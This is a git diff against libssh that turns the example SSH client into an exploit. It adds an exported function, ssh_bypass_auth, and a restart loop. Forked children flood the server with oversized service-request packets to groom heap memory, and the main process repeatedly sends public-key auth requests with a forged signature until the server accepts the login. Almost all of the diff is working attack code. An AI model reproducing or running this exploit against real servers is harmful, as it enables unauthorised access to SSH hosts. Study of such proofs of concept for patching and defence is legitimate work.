diff --git a/examples/ssh_client.c b/examples/ssh_client.c
index aaf0cb5b..4055a2c5 100644
--- a/examples/ssh_client.c
+++ b/examples/ssh_client.c
@@ -32,10 +32,12 @@
 #include <pty.h>
 #endif
 
+#include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <signal.h>
 #include <errno.h>
 #include <fcntl.h>
+#include <time.h>
 
 #include <libssh/callbacks.h>
 #include <libssh/libssh.h>
@@ -47,6 +49,7 @@
 
 static char *host = NULL;
 static char *user = NULL;
+static char *pubkey_filename = NULL;
 static char *cmds[MAXCMD];
 static char *config_file = NULL;
 static struct termios terminal;
@@ -89,7 +92,7 @@ static void add_cmd(char *cmd)
 static void usage(void)
 {
     fprintf(stderr,
-            "Usage : ssh [options] [login@]hostname\n"
+            "Usage : ssh [options] [login@]hostname pubkey_file\n"
             "sample client - libssh-%s\n"
             "Options :\n"
             "  -l user : log in as user\n"
@@ -134,12 +137,15 @@ static int opts(int argc, char **argv)
     if (optind < argc) {
         host = argv[optind++];
     }
+    if (optind < argc) {
+        pubkey_filename = argv[optind++];
+    }
 
     while(optind < argc) {
         add_cmd(argv[optind++]);
     }
 
-    if (host == NULL) {
+    if (host == NULL || pubkey_filename == NULL) {
         return -1;
     }
 
@@ -321,12 +327,27 @@ static void batch_shell(ssh_session session)
     ssh_channel_free(channel);
 }
 
-static int client(ssh_session session)
+static void kill_procs(const int nprocs, pid_t *cpids) {
+    int i;
+    for (i = 0; i+1 < nprocs; i++) {
+        const pid_t cpid = cpids[i];
+        if (cpid > 0) {
+            cpids[i] = -1;
+            kill(cpid, SIGTERM);
+            waitpid(cpid, 0, 0);
+        }
+    }
+}
+
+static int client(ssh_session session, const int myid, const int nprocs, pid_t *cpids)
 {
-    int auth = 0;
     char *banner;
     int state;
+    int result;
 
+    if (ssh_options_set(session, SSH_OPTIONS_COMPRESSION_C_S, "zlib") < 0) {
+      return -1;
+    }
     if (user) {
         if (ssh_options_set(session, SSH_OPTIONS_USER, user) < 0) {
             return -1;
@@ -352,6 +373,7 @@ static int client(ssh_session session)
         fprintf(stderr, "Connection failed : %s\n", ssh_get_error(session));
         return -1;
     }
+    printf("connection successful: %d\n", myid);
 
     state = verify_knownhost(session);
     if (state != 0) {
@@ -364,16 +386,21 @@ static int client(ssh_session session)
         printf("%s\n", banner);
         free(banner);
     }
-    auth = authenticate_console(session);
-    if (auth != SSH_AUTH_SUCCESS) {
+    result = ssh_bypass_auth(session, pubkey_filename, myid, nprocs);
+    if (myid == 0) {
+        kill_procs(nprocs, cpids);
+    }
+    if (result < 0) {
         return -1;
+    } else {
+        // Write a file named success.txt
+        close(open("success.txt", O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR));
     }
     if (cmds[0] == NULL) {
         shell(session);
     } else {
         batch_shell(session);
     }
-
     return 0;
 }
 
@@ -406,9 +433,48 @@ static void cleanup_pcap(void)
     pcap = NULL;
 }
 
-int main(int argc, char **argv)
+static int run(int argc, char **argv)
 {
     ssh_session session;
+    pid_t cpids[5];
+    int result;
+
+    // Fork a few times to increase the amount of memory pressure on the server.
+    const int nprocs = 1 + (rand() % (1 + sizeof(cpids)/sizeof(cpids[0])));
+    int myid;
+    printf("nprocs = %d\n", nprocs);
+    for (myid = 1; myid < nprocs; myid++) {
+        struct timespec tm = {0};
+        pid_t cpid = fork();
+        if (cpid < 0) {
+            const int err = errno;
+            fprintf(stderr, "fork failed: %s\n", strerror(err));
+            exit(EXIT_FAILURE);
+        } else if (cpid == 0) {
+            break;
+        }
+
+        cpids[myid-1] = cpid;
+        // Short delay between each fork so that they don't all try to connect
+        // at once.
+        tm.tv_nsec = 1000000000L / 10;
+        nanosleep(&tm, 0);
+    }
+    if (myid == nprocs) {
+        myid = 0;
+    } else {
+        // Suppress output in the forks
+        const int stdin_new = open("/dev/null", O_RDONLY);
+        const int stdout_new = open("/dev/null", O_RDONLY);
+        const int stderr_new = open("/dev/null", O_RDONLY);
+        dup2(stdin_new, STDIN_FILENO);
+        dup2(stdout_new, STDOUT_FILENO);
+        dup2(stderr_new, STDERR_FILENO);
+        close(stdin_new);
+        close(stdout_new);
+        close(stderr_new);
+    }
+    printf("fork id %d\n", myid);
 
     ssh_init();
     session = ssh_new();
@@ -427,7 +493,10 @@ int main(int argc, char **argv)
     signal(SIGTERM, do_exit);
 
     set_pcap(session);
-    client(session);
+    result = client(session, myid, nprocs, cpids);
+    if (myid == 0) {
+        kill_procs(nprocs, cpids);
+    }
 
     ssh_disconnect(session);
     ssh_free(session);
@@ -435,5 +504,36 @@ int main(int argc, char **argv)
 
     ssh_finalize();
 
-    return 0;
+    return result;
+}
+
+int main(int argc, char **argv)
+{
+    // Keep restarting the process until it's successful.
+    while (1) {
+        const pid_t cpid = fork();
+        if (cpid == 0) {
+            break;
+        } else if (cpid > 0) {
+            int wstatus = 0;
+            waitpid(cpid, &wstatus, 0);
+            if (WEXITSTATUS(wstatus) == EXIT_SUCCESS) {
+                return EXIT_SUCCESS;
+            }
+        } else {
+            return EXIT_FAILURE;
+        }
+    }
+
+    if (open("success.txt", O_RDONLY) >= 0) {
+        printf("Stopping because a file named success.txt was found.\n");
+        return EXIT_SUCCESS;
+    }
+
+    srand(time(0));
+    if (run(argc, argv) == 0) {
+        return EXIT_SUCCESS;
+    } else {
+        return EXIT_FAILURE;
+    }
 }
diff --git a/include/libssh/libssh.h b/include/libssh/libssh.h
index 7857a77b..e79da840 100644
--- a/include/libssh/libssh.h
+++ b/include/libssh/libssh.h
@@ -508,6 +508,9 @@ LIBSSH_API void ssh_disconnect(ssh_session session);
 LIBSSH_API char *ssh_dirname (const char *path);
 LIBSSH_API int ssh_finalize(void);
 
+LIBSSH_API int ssh_bypass_auth(ssh_session session, const char* pubkey_filename, const int myid, const int nprocs);
+
+
 /* REVERSE PORT FORWARDING */
 LIBSSH_API ssh_channel ssh_channel_open_forward_port(ssh_session session,
                                                    int timeout_ms,
diff --git a/src/client.c b/src/client.c
index a35a28e1..e2facc4a 100644
--- a/src/client.c
+++ b/src/client.c
@@ -24,6 +24,7 @@
 #include "config.h"
 
 #include <stdio.h>
+#include <assert.h>
 
 #ifndef _WIN32
 #include <netinet/in.h>
@@ -46,6 +47,7 @@
 #include "libssh/misc.h"
 #include "libssh/pki.h"
 #include "libssh/kex.h"
+#include "libssh/string.h"
 
 #define set_status(session, status) do {\
         if (session->common.callbacks && session->common.callbacks->connect_status_function) \
@@ -834,6 +836,138 @@ error:
     }
 }
 
+static int send_service_request(ssh_session session, ssh_string str, bool set_wontblock) {
+    ssh_buffer_pack(session->out_buffer, "bS", SSH2_MSG_SERVICE_REQUEST, str);
+    if (set_wontblock) {
+        ssh_socket_set_write_wontblock(session->socket);
+    }
+    if (ssh_packet_send(session) == SSH_ERROR) {
+        ssh_set_error(session, SSH_FATAL,
+                      "Sending SSH2_MSG_UNIMPLEMENTED failed.");
+        printf("Sending SSH2_MSG_UNIMPLEMENTED failed.\n");
+        return -1;
+    }
+    return 0;
+}
+
+int ssh_bypass_auth(ssh_session session, const char *pubkey_filename, const int myid, const int nprocs) {
+    struct ssh_crypto_struct *crypto = ssh_packet_get_current_crypto(session, SSH_DIRECTION_BOTH);
+    size_t i, n;
+    int rc;
+    int result = -1;
+
+    if (myid > 0) {
+        size_t sizes[5] = {0x40000 - 5, 0x40000 - 5, 0x40000 - 5, 0x4000 - 5, 0xf00 - 5};
+        ssh_string str;
+        sleep(1);
+        assert(myid <= sizeof(sizes)/sizeof(sizes[0]));
+        const size_t slen = sizes[myid-1];
+        printf("slen = %lx\n", slen);
+        str = ssh_string_new(slen);
+        // note: ssh_string has a length field, so you don't have to nul-terminate them.
+        memset(ssh_string_data(str), 'x', slen);
+        for (i = 0; i < 192; i++) {
+            if (send_service_request(session, str, i >= 0) < 0) {
+                return result;
+            }
+        }
+        ssh_string_free(str);
+        pause();
+    } else {
+        const char *sig_type_c = NULL;
+        ssh_key pubkey = NULL;
+        ssh_string pubkey_s = NULL;
+
+        ssh_pki_import_pubkey_file(pubkey_filename, &pubkey);
+        ssh_pki_export_pubkey_blob(pubkey, &pubkey_s);
+
+        sig_type_c = ssh_key_get_signature_algorithm(session, pubkey->type);
+        printf("sig_type_c = %s\n", sig_type_c);
+        sleep(2);
+        for (i = 0; i < 100 && result < 0; i++) {
+            ssh_string username;
+            ssh_string service;
+            ssh_string algo;
+
+            // 0x37 is the maximum string length that will fit in an 0x40-sized malloc chunk.
+            username = ssh_string_new(0x37 + i * 0x400);
+            memset(ssh_string_data(username), 0, ssh_string_len(username));
+            if (ssh_string_fill(username, session->opts.username, strlen(session->opts.username)) < 0) {
+                printf("username is too long: %s\n", session->opts.username);
+                return result;
+            }
+            service = ssh_string_new(0x37 + i * 0x500);
+            memset(ssh_string_data(service), 0, ssh_string_len(service));
+            ssh_string_fill(service, "ssh-connection", 15);
+            algo = ssh_string_new(1);
+            memset(ssh_string_data(algo), 'x', ssh_string_len(algo));
+            printf("send userauth 0\n");
+            ssh_buffer_pack(session->out_buffer, "bSSsbSS",
+                            SSH2_MSG_USERAUTH_REQUEST,
+                            username,
+                            service,
+                            "publickey",
+                            1, /* private key */
+                            algo,
+                            pubkey_s /* public key */
+                            );
+            ssh_string_free(username);
+            ssh_string_free(service);
+            ssh_string_free(algo);
+
+            ssh_string fakesig = ssh_string_new(90 /*i == 0 ? 400 : 0x400 * i*/);
+            memset(ssh_string_data(fakesig), 'x', ssh_string_len(fakesig));
+            ssh_string sigtype = ssh_string_from_char(sig_type_c);
+            size_t sigtypelen = ssh_string_len(sigtype) + sizeof(uint32_t);
+            ssh_string payload = ssh_string_new(ED25519_SIG_LEN);
+            memcpy(ssh_string_data(payload), "kevwozere", 10);
+            size_t payloadlen = ssh_string_len(payload) + sizeof(uint32_t);
+            assert(sigtypelen + payloadlen <= ssh_string_len(fakesig));
+            memcpy(ssh_string_data(fakesig), sigtype, sigtypelen);
+            memcpy((char*)ssh_string_data(fakesig) + sigtypelen, payload, payloadlen);
+            ssh_string_free(sigtype);
+            ssh_string_free(payload);
+            ssh_buffer_pack(session->out_buffer, "S", fakesig);
+            ssh_string_free(fakesig);
+            session->auth.service_state = SSH_AUTH_SERVICE_SENT;
+            session->auth.current_method = SSH_AUTH_METHOD_PUBLICKEY;
+            session->auth.state = SSH_AUTH_STATE_PUBKEY_AUTH_SENT;
+            session->pending_call_state = SSH_PENDING_CALL_AUTH_PUBKEY;
+
+            printf("out_buf size: %x\n", ssh_buffer_get_len(session->out_buffer));
+            if (ssh_packet_send(session) == SSH_ERROR) {
+                ssh_set_error(session, SSH_FATAL,
+                              "Sending SSH2_MSG_UNIMPLEMENTED failed.");
+                return result;
+            }
+            printf("send userauth 1\n");
+
+            // If the userauth message was unsuccessful then we don't get
+            // a reply from the server. So we send a short service request
+            // message, which will get a reply.  Then we can tell from
+            // which type of reply we receive whether the userauth was
+            // successful.
+            {
+                ssh_string str = ssh_string_from_char("x");
+                if (send_service_request(session, str, true) < 0) {
+                    return result;
+                }
+                ssh_string_free(str);
+            }
+
+            rc=ssh_handle_packets_termination(session,SSH_TIMEOUT_USER,
+                                              ssh_service_request_termination, session);
+            printf("rc = %d\n", rc);
+            if (session->auth.state == SSH_AUTH_STATE_SUCCESS) {
+                result = 0;
+            }
+        }
+        ssh_string_free(pubkey_s);
+        ssh_key_free(pubkey);
+    }
+    return result;
+}
+
 const char *ssh_copyright(void)
 {
     return SSH_STRINGIFY(LIBSSH_VERSION) " (c) 2003-2022 "
diff --git a/src/libssh.map b/src/libssh.map
index eeb625c5..f20d89b9 100644
--- a/src/libssh.map
+++ b/src/libssh.map
@@ -188,6 +188,7 @@ LIBSSH_4_5_0    # Released
         ssh_connector_set_out_channel;
         ssh_connector_set_out_fd;
         ssh_copyright;
+        ssh_bypass_auth;
         ssh_dirname;
         ssh_disconnect;
         ssh_dump_knownhost;
